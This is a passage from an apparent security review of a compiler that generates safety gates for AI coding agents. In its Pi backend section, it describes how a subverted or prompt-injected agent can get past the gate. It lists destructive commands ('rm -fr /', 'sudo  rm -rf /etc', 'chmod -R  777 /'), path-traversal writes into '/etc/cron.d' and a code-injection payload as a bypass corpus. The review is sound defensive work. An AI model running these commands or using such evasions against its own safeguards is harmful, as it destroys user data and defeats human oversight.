  Residual Risk + Monitoring. Honesty is preserved (the lock still reports the adapted
  status; the run-time banner states the policy is NOT active).
- **F-G6 — Enforcement-honesty is correct and loud (Informational, positive).**
  *Evidence:* `_build_degradation_report` (`goose.py:450-483`) raises if the descriptor
  ever marks a capability `native` (`:457-461`), sets `enforced:false` for every
  capability, distinguishes `gated` (adapted) from advisory, and emits a top-level
  `DEGRADATION` string stating "adapted != enforced". The launcher prints `MODE:` lines
  ("enforcement-APPROXIMATE … NOT native blocking"). `goose.json` marks nothing
  `native`. NFR-003 is satisfied. No `native` claim anywhere.

### Required Fixes Before Ship

**No critical/high ship blocker.** There is **no reachable YAML key-injection** and
enforcement honesty is correct, so Phase 3 is not gated on a security BLOCKER. The
recommended pre-ship fixes (owner: **executor**) are the secret-handling hardenings,
which are cheap and reduce a real Medium local-disclosure window:

1. **F-G3** — `chmod 600` (or `umask 077`) the ephemeral `config.yaml` copy.
2. **F-G4** — extend the trap to `EXIT INT TERM HUP`.

These two are "should-fix before ship" (Medium), not blockers. The serializer
hardenings (F-G1, F-G2) are strongly recommended but currently latent (unreachable);
they may ship as fast-follow if a serializer unit test pins the "block first line is
never attacker-controlled" invariant.

### Defense-in-Depth Recommendations

- **Pin the serializer invariant.** Add the explicit `|`-indent indicator (F-G1) so
  block-literal containment no longer depends on the first line being a fixed prefix;
  this converts the "currently unreachable" guarantee into a structural one.
- **Schema-validate emitted recipes in-process.** The design already runs `goose recipe
  validate` in tests and the launcher validates before running; consider asserting the
  emitted dict's top-level keys are a fixed allowlist (`version`, `title`, `description`,
  `instructions`, `prompt`, `parameters`, `extensions`, `sub_recipes`, `settings`)
  *after* a parse round-trip, so any future serializer regression that injects a key
  fails the build (outputs that drive downstream actions should be schema-validated).
- **Least privilege on the temp secret.** Beyond F-G3/F-G4, consider passing provider
  credentials via env instead of copying the whole `config.yaml`, or copying only the
  non-secret subset needed — narrowing what lands on disk.
- **Human-in-the-loop is already the default** (`smart_approve` gates tool calls); keep
  `auto` out of the launcher (confirmed absent).
- **Tighten `SYSTEM2_NO_PERMISSIONS` ergonomics** (F-G5): consider requiring the flag
  twice or printing the degradation report path it bypasses, to resist coached misuse.

### Residual Risk + Monitoring Plan

- **Residual: adapted ≠ native enforcement.** On Goose, `block-dangerous` /
  `protect-sensitive` are best-effort `ask_before` + `smart_approve` decisions, not
  deterministic blocks; `enforce-lease`/`format`/`typecheck`/`budget` are advisory text.
  This is inherent to the target and is honestly reported (F-G6). *Monitor:* keep the
  `AC-G3`/`AC-G6` tests asserting nothing is `native` and the `DEGRADATION` string is
  present; alert on any descriptor change that flips a status to `native`.
- **Residual: temp secret window** until F-G3/F-G4 land — a local attacker or an
  uncaught signal can expose the `0644` key copy. *Monitor:* none automated; close via
  the two pre-ship fixes.
- **Residual: serializer latent defects (F-G1/F-G2)** stay benign only while no
  emitted block's first line is attacker-controlled. *Monitor:* a serializer unit test
  plus the top-level-key allowlist assertion above would turn a future reachability
  regression into a build failure.
- **Residual: `SYSTEM2_NO_PERMISSIONS=1` / `SYSTEM2_KEEP_CONFIG=1` misuse.** Both
  weaken the posture by design and both print LOUD notices. *Monitor:* documentation +
  the runtime banners are the control; no further action required for ship.

**Explicit verdicts.** (a) **YAML emission is injection-safe** against top-level /
`extensions` / `sub_recipes` key-injection through every currently-reachable
interpolation point — no breakout was constructible; the two serializer defects found
are latent robustness issues, not reachable injections. (b) **The launcher's
secret-copy is acceptable** (parent dir `0700`, `~/.config/goose` never mutated, honest
adapted-default) **but not hardened** — apply F-G3 (`chmod 600`) and F-G4 (broader trap)
before ship to close the Medium local-disclosure window. **No high/critical BLOCKER.**

## Phase 4 — Pi Backend

### Scope of Review

The net-new Pi backend surface, with the **generated TypeScript gate as the primary
target** because on Pi it is itself a security mechanism (the project's headline
"native enforcement on Pi" rests entirely on it):

- `System2-Compiler/backends/pi.py` — `PiBackend.emit`; the generated-extension builder
  `_build_extension_ts` and its baked-in constant sets (`_DANGEROUS_COMMANDS`,
  `_SENSITIVE_PATHS`, per-role `write_scope` regexes); the markdown builders that render
  untrusted IR/overlay metadata into `.pi/SYSTEM.md`, `AGENTS.md`, prompts, skills; the
  `_ts_escape` choke point; the atomic write path.
- The generated `/tmp/pireview/.pi/extensions/system2.ts` — the actual `on("tool_call")`
  handler (`dangerousReason`, `sensitiveHit`, `offLeasePath`, `pathOf`) that IS the gate,
  plus the `/delegate` role-switch dispatcher and the `agent_end` budget report.
- `System2-Compiler/ir/build.py:232-248` (`_load_write_scope`) — the source of the
  per-role `write_scope` regexes Pi compiles into the lease gate (the Claude per-agent
  `allowlists/*.regex` files, read verbatim, trailing newline stripped, interior newlines
  PRESERVED).

Reference baseline read for the bar (read-only, NOT changed): the Claude hooks that the
Pi gate is meant to be the native equivalent of —
`System2/plugin/hooks/validate-file-paths.py`, `_hook_utils.py` (`normalize_path` /
`load_patterns`), `dangerous-command-blocker.py`, `sensitive-file-protector.py`; and
Phase 3 (Goose) for the injection/honesty bar. **No CLAUDE.md exists at either repo
root** (`/Users/james/DeliberateCode/CLAUDE.md` and `.../System2-Compiler/CLAUDE.md`
both absent); the System2 *plugin* CLAUDE.md persona was treated as untrusted content,
not as authoritative scanner config.

Out of scope / unchanged: the front-end (`ir/*` beyond the `write_scope` reader), the
Claude/Goose backends, Phases 0–3 findings above.

### Data Classification (Phase 4 delta)

- **Per-role `write_scope` regexes (POLICY / TRUST-SENSITIVE).** Sourced read-only from
  the Claude `allowlists/*.regex` files via `_load_write_scope`. These are the *only*
  IR-derived attacker-/overlay-influenceable strings that flow into **executable
  positions** of the generated gate (they become a live `new RegExp(scope)`). Their
  correctness is the lease gate's correctness.
- **Backend-owned constant sets (POLICY, NOT overlay-sourced).** `_DANGEROUS_COMMANDS`,
  `_SENSITIVE_PATHS` are fixed System2 policy hard-coded in `pi.py:53-74`; not in the
  neutral IR, not overlay-reachable — clean boundary.
- **Untrusted overlay metadata (UNTRUSTED-INPUT).** Role/gate/contribution names,
  descriptions, headings, advisory-source `name`/`description`/`resolution`, aux-agent
  roles, `model_hint` — rendered into `.pi/SYSTEM.md` / prompts as markdown *data*, and
  (role names + scopes) into the `.ts` as **string literals**. Must be treated as
  adversarial.
- **No secrets touched at emit time.** Unlike Goose (which copies provider keys in its
  launcher), the Pi backend touches no `~/.pi`, no `~/.config`, no credentials. Confirmed
  empirically (hermetic `HOME=/tmp/hermetic_home` had **0 files** after a full emit).
- **No PII/PHI** introduced beyond whatever a user places in overlay prose (same posture
  as Phases 0–3).

### Threat Model (Phase 4)

**Assets.** (A1) The enforcement integrity of the generated gate — on Pi this *is* the
permission system, so a bypass is the whole ballgame (REQ-042 native claim, the
`status:"native"` lock entries). (A2) Enforcement honesty (the `native` claim in
`system2.pi.lock.json` must be true, not aspirational). (A3) The generated `.ts` source
integrity — no overlay string may become executable TS.

**Actors.** (T1) A malicious/compromised overlay or allowlist author (controls
`write_scope` regex text + overlay metadata). (T2) A subverted or prompt-injected agent
running under Pi that *wants* to escape its lease / run a destructive command / read a
secret, and probes the gate for evasions (the highest-value actor here — the gate's
adversary is the very agent it constrains). (T3) A user who trusts the "NATIVE" banner.

**Trust boundaries.**
1. **Untrusted IR strings → executable TS** (`_ts_escape` → string literal in
   `system2.ts`). Boundary = the escaper. **Verdict: SAFE** (see F-P5).
2. **Agent-supplied `tool_call` input → the gate's allow/block decision** (the
   `dangerousReason`/`sensitiveHit`/`offLeasePath` matchers). Boundary = the matching
   logic. **Verdict: BYPASSABLE** — multiple reachable evasions, see F-P1/F-P2 (BLOCKER
   class), plus a fail-closed denial-of-function bug F-P3.
3. **Emit purity** — `emit` must not execute overlay content, stay stdlib-only, never
   touch `$HOME`/`~/.pi`. **Confirmed clean.**

### Abuse Cases (Phase 4)

1. **Destructive-command evasion.** A subverted agent runs `rm -fr /` (flag order),
   `rm  -rf /` (double space), `rm -r -f /` (separated), `rm --recursive --force /`
   (long flags), `sudo  rm -rf /etc`, `chmod -R  777 /`, or `git push -f` — all of which
   the Claude reference `dangerous-command-blocker.py` catches via `_RM_RF_FLAGS` regexes
   but the Pi gate's literal `command.includes("rm -rf /")` does NOT. *Tested live:* all
   PASS the gate (see F-P1).
2. **Write-lease traversal escape.** The `executor` role (the compiled DEFAULT
   `activeRole`) writes `../../etc/cron.d/evil.sh` or `../secret.py`. The unanchored
   `re.test(p)` plus the executor scope's `.*\.(…|sh|py|…)$` alternation matches the
   suffix *anywhere in the string*, and the gate does NO path normalization, so the
   traversal path is ALLOWED. *Tested live:* not blocked (see F-P2).
3. **Lease gate bricking (denial-of-function / honesty break).** The `design-architect`
   role's `write_scope` is a THREE-LINE allowlist
   (`^spec/design\.md$` ⏎ `^spec/interfaces\.json$` ⏎ `^spec/module-boundaries\.json$`).
   `_load_write_scope` preserves the interior `\n`; `pi.py` bakes the raw newline-joined
   string into `new RegExp(scope)`. In JS this compiles to ONE pattern containing literal
   `$`…`\n`…`^` with no `m` flag, which matches *none* of the role's own files. *Tested
   live:* every legitimate design-architect write is BLOCKED; the "native lease" silently
   becomes deny-all for any multi-line-allowlist role (see F-P3).
4. **Sensitive-path false-positive denial.** `sensitiveHit` is a bare substring scan, so
   `docs/credentials-policy.md`, `.env.local`, `prevention/configurations` etc. are
   blocked as "sensitive" even though they are not secrets — and conversely the scan is
   over-broad rather than scoped to filename boundaries (see F-P4, Low).
5. **TS code-injection via hostile overlay string.** A malicious overlay sets a role name
   or (via a crafted allowlist file) a `write_scope` to
   `"]); require("child_process").execSync("id"); ([("` aiming to break out of the
   emitted string literal into executable TS. *Tested:* `_ts_escape` (= `json.dumps`)
   escapes every breakout char (quotes, `\n`, ` `/` `, NUL, backticks, `${}`);
   no breakout constructible (see F-P5 — the positive, parallel to Goose's F-G "no
   reachable YAML injection").
6. **False sense of native enforcement.** A user reads `status:"native"` /
   `enforced:true` for `block-dangerous` & `enforce-lease` in `system2.pi.lock.json` and
   the loud "NATIVE — hard pre-execution blocks (real gates)" SYSTEM.md banner, and
   believes the gate actually stops `rm -fr /`. Given F-P1/F-P2 it does not. The honesty
   layer is *correct about the architecture* (the handler truly fires pre-execution and
   can block) but **the matcher inside it is unsound**, so the `native` claim is
   materially overstated for the bypassable inputs (see F-P6).
7. **Empty-scope unscoped lease (documented, honest).** `code-reviewer` has an empty
   `write_scope`; `offLeasePath` returns `undefined` (allow) → no per-path lease. This is
   loudly disclosed in the FIDELITY banner and SYSTEM.md NOTE — honest, not a finding.

### Vulnerability Checklist (Phase 4)

- **Authn/Authz.** The gate IS the authz mechanism on Pi. The role model is a single
  mutable `let activeRole` flipped by `/delegate`; default `"executor"`. Two structural
  authz weaknesses: (i) the lease matcher is bypassable/bricked (F-P2/F-P3); (ii) the
  DEFAULT un-delegated session runs as `executor`, whose scope permits `*.py/*.ts/*.sh/…`
  **anywhere** (any path ending in a code extension) — a broad default, though it is the
  intended implementation role and is non-empty (so the gate is not vacuous, just wide).
- **Input validation / injection (the gate matchers).** The central Phase-4 vector and
  where it fails. `dangerousReason` = substring `includes` (no normalization of flag
  order / whitespace / separated flags / env indirection) vs the reference's
  flag-permutation regexes ⇒ F-P1. `offLeasePath` = unanchored `re.test` on the RAW path
  with no `normalize_path` equivalent (no `./` strip, no abs→rel, no `realpath`, no `../`
  collapse) ⇒ traversal/absolute evasions F-P2. Multi-line allowlists are not `|`-joined
  the way the reference `load_patterns` does ⇒ deny-all brick F-P3.
- **Prompt injection (agentic).** Overlay metadata flows verbatim into `.pi/SYSTEM.md` /
  prompts as model-facing context. Same accepted posture as Phases 0–3: it is the same
  overlay content the front-end composer's `_scan_for_injection` (composer.py:1406) scans
  at compose time; the Pi backend ingests NO additional content files (it renders only
  structured metadata and explicitly does not read overlay content bodies). No new
  control/data confusion; untrusted text is carried as prose, not structured-tag-fenced
  (consistent prior posture, flagged as defense-in-depth, not a regression).
- **Secrets handling.** None touched at emit. No `expanduser`/`HOME`/`environ`/`.config`
  in `pi.py` code; the only `.pi/...` references are *relative* paths written under
  `project_path`. Materially better than the Goose launcher (no secret copy). Clean.
- **Logging/telemetry privacy.** `emit` logs nothing; the generated extension's
  `ctx.ui.notify` emits only static strings + the agent's own role name. No secret echo.
  Note: gate block `reason`s echo the offending path/command back to the UI (fine).
- **Dependency risk.** Emit side: stdlib-only (`json`/`os`/`shutil`/`tempfile`) +
  `ir.graph` + `_degradation`. No new third-party deps, no network. Runtime side: the
  generated `.ts` imports types from `@earendil-works/pi-coding-agent` (the host Pi
  runtime, user-installed) — same trust as the Pi binary itself.
- **Supply chain / build pipeline.** No build/transpile step added by the compiler (it
  emits `.ts` as TEXT; node/pi run only in eval tests). Identical IR ⇒ byte-identical
  tree (no timestamps), preserving reproducibility. The dangerous/sensitive sets are
  in-code constants, not fetched.

### Findings

- **F-P1 — `block-dangerous` is trivially bypassable: substring match, not the
  reference's robust regex (HIGH — ship blocker for the native claim).** *Evidence:*
  `backends/pi.py:638-645` emits `dangerousReason` as `for (pattern of DANGEROUS_COMMANDS)
  if (command.includes(pattern))` — a literal substring test over the fixed strings in
  `pi.py:53-64` (`"rm -rf /"`, `"chmod -R 777"`, `"sudo rm"`, …). The Claude reference
  `dangerous-command-blocker.py:31-90` deliberately covers flag permutations
  (`-rf`/`-fr`/`-r -f`/`--recursive --force`), interior whitespace, and `sudo`. *Live
  repro* (hermetic node, reconstructed gate logic fired as synthetic `tool_call` events):
  the following ALL return `block=false` (allowed) — `rm -fr /`, `rm  -rf /`
  (double-space), `rm -r -f /`, `rm --recursive --force /`, `rm -rf $HOME`,
  `RF='-rf'; rm $RF /`, `sudo  rm -rf /etc`, `chmod -R  777 /`, `git push -f origin main`.
  Only the exact canonical substrings (`rm -rf /`, `chmod -R 777`) block. *Impact:* the
  headline native destructive-command block is defeated by a one-character edit; the
  `system2.pi.lock.json` `block-dangerous: status:"native", enforced:true` claim is false
  for these inputs. *Remediation:* port the reference `_RM_RF_FLAGS` / DANGER_PATTERNS
  *regex* set into the generated TS (compile `RegExp`s, not substrings), normalizing
  whitespace and flag order; mirror `git reset --hard`, `git push --force[-with-lease]`,
  `chmod …777`, `curl|wget … | sh`, `dd`, `mkfs`, `shutdown` as anchored/word-boundaried
  patterns. Add an eval that fires the bypass corpus above and asserts BLOCK.

- **F-P2 — `enforce-lease` path matching is unanchored and un-normalized: traversal /
  absolute escapes (HIGH — ship blocker for the native lease claim).** *Evidence:*
  `backends/pi.py:655-668` (`offLeasePath`): `re = new RegExp(scope); return re.test(p) ?
  undefined : p` — JS `RegExp.test` is an *unanchored search*, and the path `p` is the RAW
  `input.path`/`input.file_path` with NO normalization. The Claude reference does the
  opposite: `validate-file-paths.py:63` iterates `normalize_path(path)` (strips `./`,
  derives abs↔rel, expands `~`, resolves `realpath`) and uses `pattern.match` (anchored at
  string start). Two consequences: (a) because the executor scope ends with
  `…|.*\.(py|…|ts|…|sh|…)$`, the suffix can match *anywhere*, so `../../etc/cron.d/x.sh`
  and `../secret.py` are ALLOWED (live: `block=false`) — a write-lease escape via path
  traversal; (b) any role whose scope author intended `^` anchoring is undermined for the
  alternation branches that lack their own internal `^` (the executor/test-engineer scopes
  use a leading `(?!…)` negative-lookahead + `.*` then suffix alternatives, so the leading
  `^` does not constrain the suffix branch). *Note* the canonical absolute `/etc/passwd`
  *is* blocked (no code-extension suffix), so the gate is not entirely vacuous — but any
  off-scope path with an allowed extension escapes. *Impact:* an agent can write outside
  its lease (including into parent dirs) by choosing a path that ends in an allowed
  extension. *Remediation:* in the generated TS, (i) normalize `p` before matching —
  collapse `./`, reject/normalize `..` segments, make matching relative-to-project, and
  treat absolute paths explicitly; (ii) anchor the match (`^(?:scope)$` or an explicit
  start-anchor wrapper) rather than relying on `RegExp.test`; (iii) for `..`-containing or
  absolute-outside-project paths, **fail closed** (block) regardless of suffix. Add a
  traversal eval corpus.

- **F-P3 — Multi-line `write_scope` allowlists are baked as a raw `\n`-joined RegExp →
  the lease bricks (deny-all) for those roles (HIGH — correctness + honesty break;
  fail-closed but silently vacuous "native lease").** *Evidence:* `ir/build.py:232-248`
  preserves interior newlines in `write_scope`; `pi.py:601-603,659-667` interpolates that
  raw string into `["design-architect", "^spec/design\\.md$\n^spec/interfaces\\.json$\n^spec/module-boundaries\\.json$"]`
  (see generated `system2.ts:38`) and feeds it directly to `new RegExp(scope)`. The Claude
  reference `_hook_utils.load_patterns:41-44` instead `|`-joins lines as
  `(?:p1)|(?:p2)|…`. *Live repro:* `new RegExp("^spec/design\\.md$\n^…$")` (no `m` flag)
  has source containing literal `$\n^`, and `re.test("spec/design.md")` → **false**, so
  `offLeasePath` returns the path → BLOCK. Every legitimate write by `design-architect`
  (and any future multi-line-allowlist role) is blocked; the role cannot perform its
  function. *Impact:* (a) denial-of-function for design-architect out of the box; (b) the
  `enforce-lease: native, enforced:true` honesty claim is wrong in the other direction —
  it is not a working per-path lease, it is an accidental deny-all that the FIDELITY
  banner does NOT call out (the banner only warns about *empty* scopes, not *multi-line*
  ones). *Remediation:* split `write_scope` on `\n` and `|`-join with `(?:…)` exactly as
  the reference `load_patterns` does (ignoring blank/`#` lines) before emitting; add a
  generation-time test that every role's compiled scope matches at least its own canonical
  in-scope path and rejects a clearly-out-of-scope path.

- **F-P4 — `protect-sensitive` is an unbounded substring scan: false positives and
  imprecise boundaries (LOW/MEDIUM).** *Evidence:* `pi.py:647-653` (`sensitiveHit`):
  `text.includes(marker)` over `_SENSITIVE_PATHS` (`pi.py:66-74`). *Live:* blocks
  `docs/credentials-policy.md` (contains `credentials`), `.env.local` (contains `.env`),
  and would block any path containing `secrets`/`dd`-like fragments; conversely it is not
  segment-aware (`foo.env` vs `.env`). The Claude `sensitive-file-protector.py` does
  filename/segment-aware matching. *Impact:* mostly availability (legitimate docs blocked)
  + a weaker, less precise protection than the reference; not a confidentiality bypass on
  its own (it errs toward blocking). Note the `dd` entry is absent from `_SENSITIVE_PATHS`
  but present in `_DANGEROUS_COMMANDS` as a bare `"dd"` substring, which would also block
  benign `cmd dd` / `add` — a separate FP. *Remediation:* match on path segments /
  filename basename and anchored markers (e.g. basename `== ".env"` or starts-with for
  dir markers) rather than raw `includes`; align with the reference protector's semantics.

- **F-P5 — TS string-literal escaping is sound: no code-injection from untrusted IR
  (Informational, POSITIVE).** *Evidence:* every IR-derived value interpolated into the
  generated `.ts` at *generation* time passes through `_ts_escape` = `json.dumps`
  (`pi.py:141-150`); the four sites are `_build_extension_ts:599-604` (dangerous,
  sensitive, role-name+scope pairs, valid-roles). *Tested* against a breakout corpus —
  `"]);require("child_process").execSync("id");([("`, `x");process.exit(1);//`, embedded
  `"`, `\n`, JS line separators ` `/` `, NUL, `` `${process.env}` `` — every
  output is a single well-formed double-quoted literal (round-trips via `json.loads`);
  ` `/` ` (which ARE JS line terminators and would otherwise split a literal)
  are escaped to ` `/` `. The runtime backtick template literals in the gate
  (`system2.ts:61,100,107,112,127,137,143`) interpolate ONLY runtime values
  (`pattern`/`sBash`/`sPath`/`off`/`activeRole`/`role`) emitted as static source text — no
  Python-side IR string is ever placed inside a TS template literal. **No TS injection is
  constructible.** Parallel to Goose's "no reachable YAML key-injection" verdict.

- **F-P6 — Enforcement honesty is architecturally correct but the `native` claim is
  materially overstated given F-P1/F-P2/F-P3 (MEDIUM, honesty).** *Evidence:* the
  degradation report (`pi.py:550-566`) and SYSTEM.md (`_enforcement_summary:256-298`)
  correctly state the *architecture* — the `on("tool_call")` handler does fire
  pre-execution and CAN return `{block:true}`, so the *seam* is genuinely native (unlike
  Goose's adapted approvals), and the empty-scope case IS loudly disclosed. *But* the
  report asserts `block-dangerous`/`enforce-lease` `enforced:true` without qualification,
  while the matchers behind them are bypassable (F-P1/F-P2) or accidentally deny-all
  (F-P3). The FIDELITY banner warns only about *empty* scopes, not about the matcher
  weaknesses. *Impact:* a user/operator over-trusts the block. *Remediation:* once
  F-P1/F-P2/F-P3 are fixed the claim becomes true; until then the `native` honesty is
  contingent on those fixes. Recommend the eval suite include the bypass corpora as
  *blocking* assertions so a regression flips the build, not just the lock string.

- **F-P7 — Emit purity / boundary confirmed clean (Informational, POSITIVE).** stdlib +
  `ir.graph` + `_degradation` only; no `$HOME`/`~/.pi`/`~/.config`/`environ` access in
  code; hermetic `HOME` had 0 files after emit; writes confined to `project_path` via
  temp-file + `os.replace` with backup/restore (`_write_outputs:781-836`); no execution or
  transpilation of untrusted content at emit time; deterministic (no timestamps). Matches
  the Phase 0–3 boundary bar.

### Required Fixes Before Ship

**There IS a ship blocker this time** (distinct from Phase 3). The Pi backend's entire
value proposition is *native enforcement*, and three reachable defects make the gate
unsound. Owner: **executor** (the generated-TS matcher logic in `backends/pi.py`).

1. **F-P1 (HIGH, BLOCKER)** — replace the substring `dangerousReason` with the reference
   flag-permutation/whitespace-tolerant **regex** set; assert the bypass corpus blocks.
2. **F-P2 (HIGH, BLOCKER)** — normalize the path (collapse `./`, handle `..`, abs↔rel) and
   **anchor** the lease match; fail closed on `..`/out-of-project absolute paths.
3. **F-P3 (HIGH, BLOCKER)** — `|`-join multi-line `write_scope` allowlists (mirroring
   `load_patterns`) before `new RegExp`; add a per-role in-scope/out-of-scope generation
   test (fixes the design-architect deny-all and the silent honesty break).

Each blocker is independently exploitable by the very agent the gate is meant to
constrain (T2), so all three gate the "native on Pi" claim. They are cheap (the correct
reference logic already exists in the Claude hooks — port it).

Recommended (not blocking) before ship:

4. **F-P4 (LOW/MEDIUM)** — segment/basename-aware `sensitiveHit`; fix the bare-`"dd"` FP.
5. **F-P6 (MEDIUM)** — keep the `native` claim contingent on 1–3 landing; wire the bypass
   corpora as *blocking* evals so the honesty claim is test-enforced, not just asserted.

### Defense-in-Depth Recommendations

- **Reuse the reference matchers, don't reimplement.** F-P1/F-P2/F-P3 all stem from the
  generated TS *re-deriving* matching logic the Claude hooks already got right
  (`_RM_RF_FLAGS`, `normalize_path`, `load_patterns`'s `|`-join). Generate TS that mirrors
  those exact semantics so the Pi gate and the Claude hook can't drift.
- **Fail closed.** The lease currently fails *open* on an empty scope (by design,
  disclosed) but also fails open on un-normalized traversal (F-P2). For paths the gate
  cannot confidently classify (contains `..`, absolute outside project, decode-ambiguous),
  block by default.
- **Anchor every emitted scope.** Wrap each role scope as a fully-anchored pattern at
  generation time so an unanchored allowlist line can't accidentally match a suffix
  anywhere.
- **Schema/shape-validate the generated gate in tests.** The design runs node/pi in eval
  tests; add property tests that fire (a) the dangerous-command bypass corpus, (b) the
  traversal corpus, (c) one in-scope + one out-of-scope path per role, asserting the
  block/allow decision — turning any future matcher regression into a build failure
  (outputs that drive downstream actions / enforcement should be assertion-pinned).
- **Human-in-the-loop for irreversible actions.** The Pi gate is purely automatic; there
  is no approval seam for a borderline-dangerous command (unlike Goose's `ask_before`).
  Consider an `ask`/confirm tier for commands that match a "suspicious but not certainly
  destructive" set, so the block list need not be exhaustive to be safe.
- **Treat the role-switch as state.** `let activeRole` is process-global mutable; ensure
  `/delegate` to an unknown role cannot silently leave a stale permissive role active
  (current code rejects unknown roles and does not change `activeRole` — good; keep it).

### Residual Risk + Monitoring Plan

- **Residual (BLOCKER until fixed): the native gate is bypassable/bricked.** Until
  F-P1/F-P2/F-P3 land, `block-dangerous` and `enforce-lease` do not deliver the native
  guarantee the lock/banner claim. *Monitor:* gate ship on the three blocking eval corpora
  above; alert if any lands `status:"native"`/`enforced:true` without the corpus passing.
- **Residual: default-role breadth.** Even after fixes, an un-delegated session runs as
  `executor` with a broad code-extension scope. *Monitor:* document that the default is
  intentionally the implementation role; consider a narrower or read-only default for
  un-delegated turns.
- **Residual: sensitive-path imprecision (F-P4).** Errs toward over-blocking (availability,
  not confidentiality) until segment-aware matching lands. *Monitor:* none automated; close
  via F-P4.
- **Residual: prompt injection via overlay prose into SYSTEM.md/prompts.** Same accepted
  posture as Phases 0–3; the front-end `_scan_for_injection` is the control. *Monitor:*
  keep that scan covering the fields Pi renders.

**Explicit verdicts.**
**(a) Is the native gate's enforcement actually sound? — NO.** Three reachable defects,
all confirmed by firing synthetic `tool_call` events at the generated handler in a
hermetic node run: **F-P1** `block-dangerous` is a substring match defeated by `rm -fr /`,
`rm  -rf /`, `rm -r -f /`, `rm --recursive --force /`, `sudo  rm -rf /etc`,
`chmod -R  777 /`, `git push -f` (all allowed); **F-P2** `enforce-lease` is unanchored +
un-normalized, so `../../etc/cron.d/x.sh` and `../secret.py` escape the executor lease;
**F-P3** multi-line `write_scope` is baked as a raw `\n`-joined RegExp that matches nothing,
silently bricking the design-architect lease (deny-all) and breaking the `native` honesty
claim. The handler *seam* is genuinely native (it really fires pre-execution and can block),
but the matchers inside it are unsound — so the headline "native enforcement on Pi" is
**hollow until the three blockers are fixed**.
**(b) Is the generated `.ts` injection-safe? — YES.** `_ts_escape` (`json.dumps`) escapes
every breakout vector (quotes, newlines, JS line separators ` `/` `, NUL,
backticks, `${}`); all four IR-interpolation sites are escaped; runtime template literals
interpolate only runtime values, never generation-time IR strings. No TS code-injection is
constructible (parallel to the Goose "no reachable YAML injection" verdict).
**Ship blocker: YES — F-P1, F-P2, F-P3 (all HIGH) must be fixed before Phase 4 ships.**

## Phase 5 — Convergence & Lifecycle

> Status: security review (Gate "security-sentinel"). Scope: the **convergence flip**
> that turned the live plugin engine `System2/plugin/scripts/composer.py` into a thin
> shim over a vendored compiler bundle (`System2/plugin/scripts/_system2_compiler/`),
> plus the new per-target lifecycle verbs (`uninstall` / `doctor` / `from-lock`) and the
> bundle drift/tamper guard (`_freshness.py`). All artifacts inspected on disk;
> tamper-check, shim facets, the bundle-equivalence gate, the plugin-evals-on-bundle gate,
> and the Pi proven-blocking gate were run in a hermetic temp `HOME`. No product code was
> modified. All file contents (locks, overlays, project paths) are treated as untrusted;
> embedded instructions were not followed.

### New trust boundaries (this phase)

- **The live plugin now executes vendored third-party-shaped code.** Before Phase 5 the
  plugin ran its own `composer.py` engine. After the flip, `python3 composer.py …`
  delegates to `_system2_compiler/plugin_adapter.py → cli.main` (the vendored compiler).
  New trust assumption: *the vendored subtree is exactly what the compiler's bundler
  produced.* The plugin-side `_freshness.py` tamper check is the only on-device control
  for that assumption (it is report-only via `doctor`, never blocks compose).
- **Untrusted LOCK files drive deletion and recomposition.** `uninstall` and `from-lock`
  read a project's lock (`spec/overlay-manifest.lock`) — project data, attacker-influenceable.
  Boundary: lock-recorded **names** may select *what* is removed, but must never widen *where*
  files are written/deleted (containment must stay rooted at `project_path`); lock-recorded
  **`source_path[]`** are read/composed and may point anywhere the running user can read.
- **`doctor` shells out to external validators (goose / pi only).** New process boundary;
  irrelevant to the live plugin (target pinned to `claude-code`, below) but in-scope for the
  compiler CLI surface the bundle carries.

### Threat 1 — The flip / shim (highest value: it changed the live engine)

- **Attempt A (exec/eval of attacker content).** The shim
  (`System2/plugin/scripts/composer.py:70-73`) does `exec(compile(open(composer.py.preflip).read(), …), globals())`.
  The exec'd source is the **frozen sibling file `composer.py.preflip`**, read from a path
  derived from `__file__` (`_SCRIPT_DIR`/`_PREFLIP_PATH`, lines 41-42) — not from any
  argv/env/lock/overlay input. There is no `exec`/`eval`/`compile`/`__import__`/`pickle`/
  `marshal`/`os.system`/`shell=True` anywhere in the vendored bundle except inside
  `ir/_hook_security.py`, which *statically detects* those tokens in overlay hooks (it never
  runs them). **No attacker-influenceable content reaches a dynamic-execution sink.** Verdict: safe.
- **Attempt B (env-var-controlled arbitrary-code path).** `_use_bundle()` (lines 46-53)
  reads `SYSTEM2_USE_BUNDLE`. Confirmed truth table: only the exact string `"0"` selects the
  frozen preflip engine; unset / `""` / `"1"` / `"foo"` all select the bundle. **Both branches
  run code that ships inside the plugin** (the vendored bundle or the frozen preflip) — the env
  var is a binary A/B switch between two trusted, on-disk engines, not a loader for external
  code. Verdict: safe.
- **Attempt C (`sys.path` / PYTHONPATH injection).** `_run_bundle` does
  `sys.path.insert(0, _BUNDLE_DIR)` (line 59) where `_BUNDLE_DIR` is `__file__`-derived. A
  position-0 insert *could* shadow stdlib if the bundle root held a colliding module — checked:
  the only top-level bundle modules are `_freshness`, `cli`, `plugin_adapter`, none of which
  collide with any stdlib/site module (sub-modules live under the `ir`/`backends` packages and
  import as `ir.*`/`backends.*`). No stdlib-shadowing surface. Verdict: safe.
- **Zero-dependency property.** Enumerated every top-level import in the bundle: stdlib only
  (`argparse, ast, collections, dataclasses, datetime, hashlib, json, os, pathlib, re, shutil,
  subprocess, sys, tempfile, typing`) plus the bundle's own `ir`/`backends`/`cli`. No
  third-party imports. The shim adds only `os`/`sys`. **Zero-dep holds.**
- **Backout integrity.** `composer.py.preflip` is intact (173,828 bytes, ends with
  `if __name__ == "__main__": main()`), is the exec'd module body (so `import composer`
  exposes `compose`/`main`/`_uninstall`/`drift_check` byte-for-byte — verified), and the
  documented one-commit backout (`cp composer.py.preflip composer.py && rm -rf _system2_compiler/`)
  leaves zero residue. **Backout holds.**

**Verdict (a) — flip/shim safety: SAFE.** No code-execution risk introduced; no
attacker-influenceable dynamic execution; env switch is a trusted-engine A/B, not a code loader.

### Threat 2 — Lifecycle on an untrusted lock (path safety)

- **Attempt A (path traversal in `uninstall` deletion).** A crafted
  `spec/overlay-manifest.lock` with `overlays[].name = "../../../../etc/foo"` or
  `contributions_applied.auxiliary_agents = ["../../.ssh/authorized_keys"]`. Result:
  `uninstall` (`_system2_compiler/backends/claude_code.py:1722`) rejects the target name
  unless it matches `_KEBAB_RE = ^[a-z0-9]+(-[a-z0-9]+)*$` (anchored — forbids `/`, `.`, `..`),
  and re-validates every *remaining* name (line 1768). Every deletion path is
  `os.path.join(project_path, <constant>, kebab_name)`: `_compute_stale_artifacts`
  (lines 1205-1241) only ever joins `project_path` with the constants `.system2/overlays`,
